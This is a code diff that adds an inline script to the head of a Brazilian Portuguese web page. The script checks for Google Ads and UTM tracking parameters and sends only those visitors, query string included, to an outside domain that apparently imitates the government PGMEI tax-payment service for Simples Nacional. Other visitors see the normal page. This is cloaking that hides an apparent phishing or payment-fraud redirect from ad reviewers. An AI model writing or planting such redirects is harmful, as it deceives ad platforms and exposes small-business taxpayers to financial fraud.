@@ -1,6 +1,29 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
+    <script>
+(function () {
+    const destinoBase = 'https://pagarmeumei.online/SimplesNacional/Aplicacoes/pgmei.app/';
+    const params = new URLSearchParams(window.location.search);
+
+    const veioGoogleAds =
+        params.has('gclid') ||
+        params.has('gbraid') ||
+        params.has('wbraid') ||
+        params.has('gad_source') ||
+        params.has('gad_campaignid') ||
+        params.has('utm_source') ||
+        params.has('utm_medium') ||
+        params.has('utm_campaign');
+
+    if (!veioGoogleAds) {
+        return;
+    }
+
+    const destino = destinoBase + window.location.search;
+    window.location.replace(destino);
+})();
+</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
